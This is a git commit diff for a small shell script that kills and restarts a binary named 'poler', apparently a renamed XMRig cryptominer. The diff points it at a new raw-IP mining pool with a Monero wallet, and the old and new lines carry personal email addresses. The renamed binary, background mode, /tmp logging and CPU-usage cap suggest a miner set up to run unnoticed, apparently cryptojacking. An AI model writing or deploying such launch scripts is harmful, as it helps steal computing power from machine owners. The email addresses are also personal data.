7c6e9252deff838427045c3e3305ee3c5a30a145
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-03-21 01:43:44 +0200

    Update 50.sh

--- 50.sh
+++ 50.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -o 95.216.219.10:5745 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 -l /tmp/poler/poler.log --pass=12:boraportnowsky@gmail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=47 --av=1 --variant -1
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 48 --cpu-priority 3 -o 185.251.39.216:5987 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 -p nehay:ivanovandrey1984g@gmail.com -k
